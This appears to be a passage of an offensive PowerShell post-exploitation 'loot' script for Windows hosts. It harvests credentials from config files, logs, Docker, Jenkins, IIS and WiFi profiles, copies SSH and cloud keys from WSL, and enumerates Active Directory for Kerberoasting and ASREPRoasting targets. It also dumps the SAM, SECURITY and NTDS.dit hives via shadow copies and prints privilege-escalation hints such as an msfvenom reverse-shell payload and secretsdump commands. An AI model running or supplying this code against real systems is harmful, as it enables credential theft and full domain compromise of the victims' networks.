$backupCount = (Get-Content "$filesDir\backup_files_found.txt" -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
if ($backupCount -gt 0) { Write-Hit "$backupCount backup/archive files found  - see sensitive_files\backup_files_found.txt" }

# Grep for passwords in common text file types
Write-Info "Grepping for hardcoded credentials in config files..."
$grepDirs = @("C:\inetpub","C:\xampp\htdocs","C:\wamp\www","C:\Program Files","C:\Program Files (x86)","C:\Scripts","$env:USERPROFILE")
$grepResults = @()
foreach ($dir in $grepDirs) {
    if (Test-Path $dir) {
        Get-ChildItem $dir -Recurse -Include "*.xml","*.config","*.ini","*.json","*.yaml","*.yml","*.env","*.properties","*.conf" -ErrorAction SilentlyContinue | ForEach-Object {
            $hits = Select-String -Path $_.FullName -Pattern "(password|passwd|secret|api_key|apikey|token|credential)\s*[=:]\s*\S+" -CaseSensitive:$false -ErrorAction SilentlyContinue
            if ($hits) {
                $grepResults += $hits | ForEach-Object { "$($_.Filename):$($_.LineNumber): $($_.Line.Trim())" }
            }
        }
    }
}
if ($grepResults) {
    $grepResults | Select-Object -First 300 | Out-File "$filesDir\grepped_creds.txt" -ErrorAction SilentlyContinue
    Write-Hit "Hardcoded credentials found via grep  - see sensitive_files\grepped_creds.txt ($($grepResults.Count) hits)"
}

Write-OK "Sensitive file hunt complete"

# =============================================================================
# SECTION 9: ACTIVE DIRECTORY RECON
# =============================================================================
Invoke-Section "Active Directory Recon"
$adDir = "$OutputDir\active_directory"
$null = New-Item -ItemType Directory -Path $adDir -Force

# Check if domain-joined
if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
    Write-Info "Domain-joined machine detected  - running AD recon..."

    # Domain info
    nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File "$adDir\domain_info.txt" -ErrorAction SilentlyContinue
    nltest /domain_trusts 2>$null | Out-File "$adDir\domain_trusts.txt" -ErrorAction SilentlyContinue

    # High-value group membership
    $adGroups = @("Domain Admins","Enterprise Admins","Schema Admins","Administrators","Backup Operators","Account Operators","DnsAdmins","Group Policy Creator Owners","Protected Users")
    $groupOut = @()
    foreach ($group in $adGroups) {
        $members = net group $group /domain 2>$null
        if ($members) {
            $groupOut += "=== $group ==="; $groupOut += $members
        }
    }
    $groupOut | Out-File "$adDir\high_value_groups.txt" -ErrorAction SilentlyContinue
    Write-OK "AD group memberships saved"

    # SPN enumeration (Kerberoastable accounts)  - no tools required
    Write-Info "Enumerating SPNs (Kerberoastable accounts)..."
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset","lastlogon"))
        $spnResults = $searcher.FindAll()
        $spnOut = @()
        foreach ($result in $spnResults) {
            $spnOut += "User: $($result.Properties['samaccountname']) | SPNs: $($result.Properties['serviceprincipalname'] -join ', ')"
        }
        if ($spnOut) {
            $spnOut | Out-File "$adDir\kerberoastable_spns.txt" -ErrorAction SilentlyContinue
            Write-Hit "Kerberoastable SPNs found: $($spnOut.Count) account(s)  - see active_directory\kerberoastable_spns.txt"
        }
    } catch { Write-Warn "SPN enumeration failed: $_" }

    # ASREPRoast candidates (no pre-auth required)
    Write-Info "Enumerating ASREPRoast candidates..."
    try {
        $searcher2 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher2.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        $searcher2.PageSize = 1000
        $asrepResults = $searcher2.FindAll()
        $asrepOut = $asrepResults | ForEach-Object { $_.Properties['samaccountname'][0] }
        if ($asrepOut) {
            $asrepOut | Out-File "$adDir\asreproast_candidates.txt" -ErrorAction SilentlyContinue
            Write-Hit "ASREPRoast candidates found: $($asrepOut.Count) account(s)!"
        }
    } catch { Write-Warn "ASREPRoast enumeration failed: $_" }

    # All domain computers
    Write-Info "Enumerating domain computers..."
    try {
        $searcher3 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher3.Filter = "(objectCategory=computer)"
        $searcher3.PageSize = 1000
        $searcher3.PropertiesToLoad.AddRange(@("dnshostname","operatingsystem","operatingsystemversion","lastlogon","description"))
        $compResults = $searcher3.FindAll()
        $compOut = $compResults | ForEach-Object {
            "$($_.Properties['dnshostname']) | OS: $($_.Properties['operatingsystem']) $($_.Properties['operatingsystemversion']) | Desc: $($_.Properties['description'])"
        }
        $compOut | Out-File "$adDir\domain_computers.txt" -ErrorAction SilentlyContinue
        Write-OK "Domain computers saved: $($compOut.Count) host(s)"
    } catch { Write-Warn "Computer enumeration failed: $_" }

    # All domain users with interesting attributes
    Write-Info "Enumerating domain users..."
    try {
        $searcher4 = New-Object System.DirectoryServices.DirectorySearcher
        $searcher4.Filter = "(&(objectCategory=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        $searcher4.PageSize = 1000
        $searcher4.PropertiesToLoad.AddRange(@("samaccountname","description","memberof","pwdlastset","lastlogon","userAccountControl"))
        $userResults = $searcher4.FindAll()
        $usersOut = $userResults | ForEach-Object {
            "$($_.Properties['samaccountname']) | Desc: $($_.Properties['description']) | PwdLastSet: $($_.Properties['pwdlastset'])"
        }
        $usersOut | Out-File "$adDir\domain_users.txt" -ErrorAction SilentlyContinue
        # Flag users with passwords in description
        $usersOut | Where-Object { $_ -match "pass|pwd|cred|key" -and $_ -match "Desc:" } | ForEach-Object {
            Write-Hit "Possible password in AD description: $_"
        }
        Write-OK "Domain users saved: $($usersOut.Count)"
    } catch { Write-Warn "User enumeration failed: $_" }

    # Domain password policy
    net accounts /domain 2>$null | Out-File "$adDir\domain_password_policy.txt" -ErrorAction SilentlyContinue

} else {
    Write-Warn "Machine is not domain-joined  - skipping AD recon"
    "Not domain-joined" | Out-File "$adDir\not_domain_joined.txt"
}

Write-OK "AD recon complete"

# =============================================================================
# SECTION 10: NETWORK & LATERAL MOVEMENT
# =============================================================================
Invoke-Section "Network & Lateral Movement"
$netDir = "$OutputDir\network"
$null = New-Item -ItemType Directory -Path $netDir -Force

{
    "=== IP Config ==="; ipconfig /all
    "=== Routing Table ==="; route print
    "=== ARP Cache ==="; arp -a
    "=== DNS Cache ==="; ipconfig /displaydns
    "=== Active Connections ==="; netstat -ano
    "=== Listening Ports ==="; netstat -ano | Select-String "LISTENING"
    "=== Hosts File ==="; Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue
    "=== Mapped Drives ==="; net use
    "=== Network Shares ==="; net share
    "=== Domain Computers ==="; net view /domain:$env:USERDOMAIN
    "=== Firewall Profiles ==="; netsh advfirewall show allprofiles
    "=== Proxy Settings ==="; netsh winhttp show proxy
} | Out-File "$netDir\network_info.txt" -ErrorAction SilentlyContinue

# WiFi passwords
Write-Info "Extracting WiFi passwords..."
$wifiProfiles = (netsh wlan show profiles 2>$null) | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifiOut = @()
foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name=$profile key=clear 2>$null
    $password = ($details | Select-String "Key Content") -replace ".*Key Content\s*:\s*",""
    if ($password) {
        $wifiOut += "SSID: $profile | Password: $password"
        Write-Hit "WiFi password found: $profile => $password"
    }
}
$wifiOut | Out-File "$netDir\wifi_passwords.txt" -ErrorAction SilentlyContinue

# VPN configs
$vpnDirs = @(
    "$env:ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile",
    "$env:APPDATA\Palo Alto Networks\GlobalProtect",
    "$env:USERPROFILE\OpenVPN\config",
    "C:\Program Files\OpenVPN\config",
    "C:\Program Files (x86)\OpenVPN\config"
)
foreach ($d in $vpnDirs) {
    if (Test-Path $d) {
        Safe-CopyDir $d "$netDir\vpn\$(Split-Path $d -Leaf)"
        Write-Hit "VPN config found: $d"
    }
}

# RDP connection history
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$netDir\rdp_history.txt" -ErrorAction SilentlyContinue

Write-OK "Network data collected"

# =============================================================================
# SECTION 11: SCHEDULED TASKS & SERVICES
# =============================================================================
Invoke-Section "Scheduled Tasks & Services"
$taskDir = "$OutputDir\tasks_services"
$null = New-Item -ItemType Directory -Path $taskDir -Force

# Scheduled tasks  - full verbose output
Write-Info "Enumerating scheduled tasks..."
schtasks /query /fo LIST /v 2>$null | Out-File "$taskDir\scheduled_tasks_full.txt" -ErrorAction SilentlyContinue

# Find tasks running as specific users with stored credentials
$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
$interestingTasks = $tasks | Where-Object {
    $_.Principal.UserId -notmatch "SYSTEM|LOCAL SERVICE|NETWORK SERVICE|BUILTIN|NT AUTHORITY" -and
    $_.Principal.UserId -ne ""
}
if ($interestingTasks) {
    $interestingTasks | Select-Object TaskName,TaskPath,@{N="RunAs";E={$_.Principal.UserId}} | Format-Table -AutoSize | Out-String | Out-File "$taskDir\tasks_running_as_users.txt"
    Write-Hit "Scheduled tasks running as specific users: $($interestingTasks.Count) found!"
}

# Writable task XML files
Get-ChildItem "C:\Windows\System32\Tasks","C:\Windows\SysWOW64\Tasks" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $acl = Get-Acl $_.FullName -ErrorAction Stop
        if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify|Everyone.*Modify") {
            Write-Hit "Writable scheduled task file: $($_.FullName)"
        }
    } catch {}
}

# All services with binary paths
Write-Info "Enumerating services..."
Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | 
    Select-Object Name,DisplayName,State,StartMode,PathName,StartName |
    Format-Table -AutoSize | Out-String |
    Out-File "$taskDir\services_all.txt" -ErrorAction SilentlyContinue

# Services running as domain users (lateral movement targets)
$domainServices = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | 
    Where-Object { $_.StartName -and $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" }
if ($domainServices) {
    $domainServices | Select-Object Name,StartName,PathName | Format-Table -AutoSize | Out-String | Out-File "$taskDir\services_as_domain_accounts.txt"
    Write-Hit "Services running as domain accounts: $($domainServices.Count)  - potential credential target"
}

# Unquoted service paths
Write-Info "Checking for unquoted service paths..."
$unquoted = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | 
    Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows' -and $_.PathName -match " " }
if ($unquoted) {
    $unquoted | Select-Object Name,PathName | Format-Table -AutoSize | Out-String | Out-File "$taskDir\unquoted_service_paths.txt"
    Write-Hit "Unquoted service paths found: $($unquoted.Count)  - check for binary planting!"
}

# Weak service binary permissions
Write-Info "Checking service binary permissions..."
$weakServices = @()
Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
    $binPath = ($_.PathName -replace '"','').Split(' ')[0]
    if (Test-Path $binPath) {
        try {
            $acl = Get-Acl $binPath -ErrorAction Stop
            if ($acl.AccessToString -match "Everyone.*Write|Everyone.*Modify|Users.*Write|Users.*Modify|Authenticated Users.*Write|Authenticated Users.*Modify") {
                $weakServices += "$($_.Name) | Binary: $binPath | ACL: $($acl.AccessToString)"
                Write-Hit "Weak service binary permissions: $binPath"
            }
        } catch {}
    }
}
if ($weakServices) {
    $weakServices | Out-File "$taskDir\weak_service_binary_perms.txt" -ErrorAction SilentlyContinue
}

Write-OK "Tasks and services enumerated"

# =============================================================================
# SECTION 12: PRIVILEGE ESCALATION ARTIFACTS
# =============================================================================
Invoke-Section "Privilege Escalation Artifacts"
$privescDir = "$OutputDir\privesc"
$null = New-Item -ItemType Directory -Path $privescDir -Force

# Writable directories in system PATH
Write-Info "Checking PATH for writable directories..."
$pathDirs = $env:PATH.Split(';') | Where-Object { $_ -ne "" }
foreach ($dir in $pathDirs) {
    if (Test-Path $dir) {
        try {
            $acl = Get-Acl $dir -ErrorAction Stop
            if ($acl.AccessToString -match "Everyone.*Write|Everyone.*Modify|Users.*Write|Users.*Modify") {
                Write-Hit "Writable PATH directory: $dir  - DLL/EXE hijack possible!"
                "WRITABLE: $dir" | Add-Content "$privescDir\writable_path_dirs.txt" -ErrorAction SilentlyContinue
            }
        } catch {}
    }
}

# DLL hijacking opportunities  - services pointing to writable directories
Write-Info "Checking for DLL hijack opportunities..."
Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
    $dir = Split-Path ($_.PathName -replace '"','').Split(' ')[0]
    if ($dir -and (Test-Path $dir)) {
        try {
            $acl = Get-Acl $dir -ErrorAction Stop
            if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify") {
                Write-Hit "DLL hijack candidate  - writable service directory: $dir (Service: $($_.Name))"
            }
        } catch {}
    }
}

# Writable registry service keys
Write-Info "Checking service registry key permissions..."
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $acl = Get-Acl $_.PSPath -ErrorAction Stop
        if ($acl.AccessToString -match "Everyone.*Write|Everyone.*FullControl|Users.*Write|Users.*FullControl") {
            Write-Hit "Writable service registry key: $($_.PSPath)"
        }
    } catch {}
}

# Writable PSModulePath  - module hijack
$env:PSModulePath.Split(';') | ForEach-Object {
    if ($_ -and (Test-Path $_)) {
        try {
            $acl = Get-Acl $_ -ErrorAction Stop
            if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify") {
                Write-Hit "Writable PSModulePath: $_  - PowerShell module hijack possible!"
            }
        } catch {}
    }
}

# Always Install Elevated (already checked in registry, summarise here)
$aieHKCU2 = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
$aieHKLM2 = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
if ($aieHKCU2 -eq 1 -and $aieHKLM2 -eq 1) {
    Write-Hit "AlwaysInstallElevated CONFIRMED  - msfvenom -p windows/x64/shell_reverse_tcp -f msi"
}

# SeImpersonatePrivilege → Potato attacks
if ((whoami /priv 2>$null) -match "SeImpersonatePrivilege.*Enabled") {
    Write-Hit "SeImpersonatePrivilege ENABLED  - try PrintSpoofer, GodPotato, JuicyPotatoNG!"
}

# SeBackupPrivilege → SAM/NTDS dump
if ((whoami /priv 2>$null) -match "SeBackupPrivilege.*Enabled") {
    Write-Hit "SeBackupPrivilege ENABLED  - can copy SAM/SYSTEM/NTDS.dit regardless of ACLs!"
}

# SeDebugPrivilege → LSASS dump
if ((whoami /priv 2>$null) -match "SeDebugPrivilege.*Enabled") {
    Write-Hit "SeDebugPrivilege ENABLED  - can access LSASS memory for credential dump!"
}

# UAC bypass potential
$uac2 = Safe-RegQuery "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if ($uac2 -and $uac2.EnableLUA -eq 1 -and $uac2.ConsentPromptBehaviorAdmin -eq 5) {
    Write-Info "UAC is enabled with default settings  - check for UAC bypass techniques"
}

# Stored credentials via runas /savecred
$savedCreds = cmdkey /list 2>$null | Select-String "Target:"
if ($savedCreds) {
    Write-Hit "Saved credentials in Credential Manager  - try: runas /savecred /user:DOMAIN\admin cmd"
}

# Writeable folders for DLL injection in auto-start locations
$autoRunKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
$autoRunOut = @()
foreach ($key in $autoRunKeys) {
    $vals = Safe-RegQuery $key
    if ($vals) {
        $vals.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            $exePath = ($_.Value -replace '"','').Split(' ')[0]
            $autoRunOut += "Key: $key | Name: $($_.Name) | Path: $_.Value"
            if ($exePath -and (Test-Path $exePath)) {
                try {
                    $acl = Get-Acl $exePath -ErrorAction Stop
                    if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify") {
                        Write-Hit "Writable autorun binary: $exePath"
                    }
                } catch {}
            }
        }
    }
}
$autoRunOut | Out-File "$privescDir\autorun_entries.txt" -ErrorAction SilentlyContinue

Write-OK "Privilege escalation artifacts documented"

# =============================================================================
# SECTION 13: HIVE DUMP VIA VSS (ADMIN ONLY)
# =============================================================================
if ($IsAdmin) {
    Invoke-Section "Hive Dump via VSS Shadow Copy"
    $hivesDir = "$OutputDir\hives"
    $null = New-Item -ItemType Directory -Path $hivesDir -Force

    Write-Info "Attempting SAM/SYSTEM/SECURITY dump via shadow copy..."
    try {
        $shadow = (Get-WmiObject Win32_ShadowCopy -ErrorAction Stop | Select-Object -First 1)
        if ($shadow) {
            $shadowPath = $shadow.DeviceObject
            foreach ($hive in @("SAM","SYSTEM","SECURITY")) {
                $src = "$shadowPath\Windows\System32\config\$hive"
                $dst = "$hivesDir\$hive"
                cmd /c "copy $src $dst" 2>$null
                if (Test-Path $dst) {
                    Write-Hit "$hive hive extracted via VSS  - run: python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
                }
            }
        } else {
            # No existing shadow  - create one
            Write-Info "No shadow copy exists  - attempting to create one..."
            $vol = (Get-WmiObject Win32_Volume | Where-Object { $_.DriveLetter -eq "C:" }).DeviceID
            $shadowClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
            $result = $shadowClass.Create($vol, "ClientAccessible")
            if ($result.ReturnValue -eq 0) {
                $newShadow = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $result.ShadowID }
                $shadowPath = $newShadow.DeviceObject
                foreach ($hive in @("SAM","SYSTEM","SECURITY")) {
                    $src = "$shadowPath\Windows\System32\config\$hive"
                    $dst = "$hivesDir\$hive"
                    cmd /c "copy $src $dst" 2>$null
                    if (Test-Path $dst) {
                        Write-Hit "$hive hive extracted via newly created VSS  - decrypt with secretsdump!"
                    }
                }
            }
        }
    } catch { Write-Warn "VSS hive extraction failed: $_" }

    # Direct registry save (fallback)
    Write-Info "Attempting direct registry hive save..."
    foreach ($hive in @("SAM","SYSTEM","SECURITY")) {
        $dst = "$hivesDir\${hive}_reg.hiv"
        $result = reg save "HKLM\$hive" $dst /y 2>&1
        if (Test-Path $dst) {
            Write-Hit "$hive saved via reg save  - see hives\${hive}_reg.hiv"
        }
    }

    # NTDS.dit (Domain Controller only)
    if (Test-Path "C:\Windows\NTDS\NTDS.dit") {
        Write-Hit "NTDS.dit found  - this is a Domain Controller!"
        Write-Info "Attempting NTDS.dit extraction via VSS..."
        if ($shadow) {
            $src = "$($shadow.DeviceObject)\Windows\NTDS\NTDS.dit"
            cmd /c "copy $src $hivesDir\NTDS.dit" 2>$null
            if (Test-Path "$hivesDir\NTDS.dit") {
                Write-Hit "NTDS.dit extracted! Run: python3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL"
            }
        }
    }
}

# =============================================================================
# SECTION 14: DOCKER & CONTAINERS
# =============================================================================
Invoke-Section "Docker & Container Secrets"
$dockerDir = "$OutputDir\docker"
$null = New-Item -ItemType Directory -Path $dockerDir -Force

# Docker Desktop
if (Get-Command docker -ErrorAction SilentlyContinue) {
    Write-Info "Docker found  - enumerating..."
    docker ps -a 2>$null | Out-File "$dockerDir\containers.txt" -ErrorAction SilentlyContinue
    docker images 2>$null | Out-File "$dockerDir\images.txt" -ErrorAction SilentlyContinue
    docker network ls 2>$null | Out-File "$dockerDir\networks.txt" -ErrorAction SilentlyContinue
    docker volume ls 2>$null | Out-File "$dockerDir\volumes.txt" -ErrorAction SilentlyContinue
    # Extract env vars from containers
    $containerIds = docker ps -q 2>$null
    foreach ($cid in $containerIds) {
        docker inspect $cid 2>$null | Out-File "$dockerDir\inspect_$cid.json" -ErrorAction SilentlyContinue
        $envHits = docker inspect $cid 2>$null | Select-String -Pattern '"(PASSWORD|SECRET|KEY|TOKEN|API|CRED).*"' -CaseSensitive:$false
        if ($envHits) {
            $envHits | Out-File "$dockerDir\container_env_secrets.txt" -Append -ErrorAction SilentlyContinue
            Write-Hit "Secrets in Docker container $cid environment!"
        }
    }
}

# Docker Desktop config
if (Test-Path "$env:APPDATA\Docker") {
    Safe-CopyDir "$env:APPDATA\Docker" "$dockerDir\desktop_config"
    Write-OK "Docker Desktop config copied"
}

# WSL  - access Linux filesystem
if (Test-Path "\\wsl$") {
    Write-Info "WSL detected  - looting Linux filesystems..."
    $wslDistros = Get-ChildItem "\\wsl$\" -ErrorAction SilentlyContinue
    foreach ($distro in $wslDistros) {
        $wslLootDir = "$dockerDir\wsl_$($distro.Name)"
        $null = New-Item -ItemType Directory -Path $wslLootDir -Force -ErrorAction SilentlyContinue
        foreach ($path in @("root\.ssh","root\.aws","root\.azure","root\.kube","home")) {
            $src = "\\wsl$\$($distro.Name)\$path"
            if (Test-Path $src) {
                Safe-CopyDir $src "$wslLootDir\$($path -replace '[/\\]','_')"
                Write-Hit "WSL $($distro.Name) loot: $src"
            }
        }
    }
}

Write-OK "Docker/container enumeration complete"

# =============================================================================
# SECTION 15: APPLICATION & SERVICE CREDENTIALS
# =============================================================================
Invoke-Section "Application & Service Credentials"
$appDir = "$OutputDir\applications"
$null = New-Item -ItemType Directory -Path $appDir -Force

# IIS configuration
if (Test-Path "C:\Windows\System32\inetsrv\config\applicationHost.config") {
    Safe-Copy "C:\Windows\System32\inetsrv\config\applicationHost.config" "$appDir\iis\applicationHost.config"
    Write-Hit "IIS applicationHost.config found  - check app pool credentials"
    # Extract app pool identities
    $iisConfig = [xml](Get-Content "C:\Windows\System32\inetsrv\config\applicationHost.config" -ErrorAction SilentlyContinue)
    $appPools = $iisConfig.configuration."system.applicationHost".applicationPools.add | 
        Where-Object { $_.processModel.userName -and $_.processModel.userName -ne "" }
    if ($appPools) {
        $appPools | ForEach-Object {
            "AppPool: $($_.name) | User: $($_.processModel.userName) | Pass: $($_.processModel.password)"
        } | Out-File "$appDir\iis\apppool_credentials.txt"
        Write-Hit "IIS App Pool credentials found!"
    }
}

# MSSQL instances
$sqlInstances = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue
if ($sqlInstances) {
    $sqlInstances | Format-List | Out-String | Out-File "$appDir\mssql\instances.txt" -ErrorAction SilentlyContinue
    Write-Hit "MSSQL instances found  - see applications\mssql\"
}

# Jenkins
$jenkinsPaths = @(
    "C:\Program Files (x86)\Jenkins",
    "C:\Program Files\Jenkins",
    "C:\Jenkins",
    "$env:USERPROFILE\.jenkins"
)
foreach ($jPath in $jenkinsPaths) {
    if (Test-Path $jPath) {
        if (Test-Path "$jPath\secrets") {
            Safe-CopyDir "$jPath\secrets" "$appDir\jenkins\secrets"
            Write-Hit "Jenkins secrets directory found: $jPath\secrets"
        }
        # credentials.xml
        if (Test-Path "$jPath\credentials.xml") {
            Safe-Copy "$jPath\credentials.xml" "$appDir\jenkins\credentials.xml"
            Write-Hit "Jenkins credentials.xml found!"
        }
        # Job configs that may contain credentials
        Get-ChildItem "$jPath\jobs" -Recurse -Filter "config.xml" -ErrorAction SilentlyContinue | 
            Select-Object -First 20 | ForEach-Object {
                if (Select-String -Path $_.FullName -Pattern "password|credential|secret" -Quiet -ErrorAction SilentlyContinue) {
                    Safe-Copy $_.FullName "$appDir\jenkins\job_configs\$(($_.FullName -replace '[:\\]','_'))"
                }
            }
    }
}

# Git repos  - check for stored credentials
Get-ChildItem "C:\","C:\Users","C:\inetpub","C:\Projects" -Recurse -Filter ".git" -ErrorAction SilentlyContinue -Force | 
    Where-Object { $_.PSIsContainer } | Select-Object -First 20 | ForEach-Object {
        $repoPath = $_.FullName
        $gitConfig = Get-Content "$repoPath\config" -ErrorAction SilentlyContinue
        if ($gitConfig -match "url.*@|url.*://.*:.*@") {
            $gitConfig | Out-File "$appDir\git\$(($repoPath -replace '[:\\]','_'))_config.txt" -ErrorAction SilentlyContinue
            Write-Hit "Git remote URL with embedded credentials: $repoPath"
        }
    }

Write-OK "Application credentials enumerated"

# =============================================================================
# SECTION 16: LOGS  - HIGH VALUE
# =============================================================================
Invoke-Section "High-Value Event Logs"
$logsDir = "$OutputDir\logs"
$null = New-Item -ItemType Directory -Path $logsDir -Force

# Security log  - logon events
Write-Info "Extracting security event log..."
try {
    Get-WinEvent -LogName Security -MaxEvents 500 -ErrorAction Stop | 
        Where-Object { $_.Id -in @(4624,4625,4648,4672,4720,4728,4732,4756) } |
        Select-Object TimeCreated,Id,Message |
        Format-List | Out-String |
        Out-File "$logsDir\security_events_filtered.txt" -ErrorAction SilentlyContinue
    Write-OK "Security events saved (IDs: 4624,4625,4648,4672,4720,4728,4732,4756)"
} catch { Write-Warn "Could not read Security log (may need admin)" }

# PowerShell operational  - script block logging
Write-Info "Extracting PowerShell script block logs..."
try {
    Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 -ErrorAction Stop |
        Where-Object { $_.Id -eq 4104 } |
        Select-Object TimeCreated,Message |
        Format-List | Out-String |
        Out-File "$logsDir\powershell_scriptblock.txt" -ErrorAction SilentlyContinue
    $psCredsInLogs = Get-Content "$logsDir\powershell_scriptblock.txt" -ErrorAction SilentlyContinue | 
        Select-String -Pattern "password|secret|credential|ConvertTo-SecureString" -CaseSensitive:$false
    if ($psCredsInLogs) {
        $psCredsInLogs | Out-File "$logsDir\powershell_scriptblock_CREDS.txt" -ErrorAction SilentlyContinue
        Write-Hit "Credentials found in PowerShell script block logs!"
    }
} catch { Write-Warn "Could not read PS Operational log" }

# Scheduled task log
try {
    Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" -MaxEvents 100 -ErrorAction Stop |
        Format-List | Out-String |
        Out-File "$logsDir\scheduled_tasks_log.txt" -ErrorAction SilentlyContinue
} catch {}

# Application log
try {
    Get-WinEvent -LogName Application -MaxEvents 200 -ErrorAction Stop |
        Where-Object { $_.LevelDisplayName -in @("Error","Warning") } |
        Select-Object TimeCreated,ProviderName,Id,Message |
        Format-List | Out-String |
        Out-File "$logsDir\application_errors.txt" -ErrorAction SilentlyContinue
} catch {}

# IIS access logs  - grep for credentials in query strings
foreach ($iisLogDir in @("C:\inetpub\logs\LogFiles","C:\Windows\System32\LogFiles\W3SVC1")) {
    if (Test-Path $iisLogDir) {
        Get-ChildItem $iisLogDir -Recurse -Filter "*.log" -ErrorAction SilentlyContinue | 
            Select-Object -Last 5 | ForEach-Object {
                $credLines = Select-String -Path $_.FullName -Pattern "(pass(word)?|token|api_?key|secret)=[^&\s]+" -CaseSensitive:$false -ErrorAction SilentlyContinue
                if ($credLines) {
                    $credLines | Out-File "$logsDir\iis_creds_$($_.Name).txt" -ErrorAction SilentlyContinue
                    Write-Hit "Credentials in IIS log: $($_.FullName)"
                }
            }
    }
}

Write-OK "Event logs extracted"

# =============================================================================
# SECTION 17: SOFTWARE VERSIONS
# =============================================================================
Invoke-Section "Software Versions (CVE matching)"
$versDir = "$OutputDir\versions"
$null = New-Item -ItemType Directory -Path $versDir -Force

{
    "=== OS Version ==="
    [System.Environment]::OSVersion | Format-List | Out-String
    "=== PowerShell Version ==="
    $PSVersionTable | Format-Table | Out-String
    "=== .NET Versions ==="
    Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -Recurse -ErrorAction SilentlyContinue |
        Get-ItemProperty -Name Version -ErrorAction SilentlyContinue |
        Select-Object PSChildName,Version | Format-Table | Out-String
    "=== Installed Software ==="
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
        Select-Object DisplayName,DisplayVersion,Publisher,InstallDate |
        Sort-Object DisplayName | Format-Table -AutoSize | Out-String
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
        Select-Object DisplayName,DisplayVersion,Publisher |
        Sort-Object DisplayName | Format-Table -AutoSize | Out-String
    "=== Hotfixes ==="
    Get-HotFix | Sort-Object InstalledOn -Descending | Format-Table -AutoSize | Out-String
} | Out-File "$versDir\versions.txt" -ErrorAction SilentlyContinue

Write-OK "Software versions saved"

# =============================================================================
# WRAP UP & HITS SUMMARY
# =============================================================================
Write-Sec "Loot Complete"

$lootSize    = (Get-ChildItem $OutputDir -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
$totalFiles  = (Get-ChildItem $OutputDir -Recurse -File -ErrorAction SilentlyContinue | Measure-Object).Count
$totalHits   = (Get-Content $hitsFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines

Write-OK "Total loot size:  $([math]::Round($lootSize/1MB,2)) MB"
Write-OK "Total files:      $totalFiles"
Write-OK "Total hits:       $totalHits"
Write-OK "Loot directory:   $OutputDir"

Write-Host "`n$([char]0x2554)$([string][char]0x2550 * 54)$([char]0x2557)" -ForegroundColor Magenta
Write-Host "$([char]0x2551)              HITS SUMMARY                      $([char]0x2551)" -ForegroundColor Magenta
Write-Host "$([char]0x255A)$([string][char]0x2550 * 54)$([char]0x255D)" -ForegroundColor Magenta
Get-Content $hitsFile -ErrorAction SilentlyContinue | Write-Host -ForegroundColor Magenta

Write-Host "`n=== Exfil Options ===" -ForegroundColor Yellow
Write-Host "  Pack it:" -ForegroundColor Blue
Write-Host "  Compress-Archive -Path $OutputDir -DestinationPath `$env:TEMP\loot.zip"
Write-Host ""
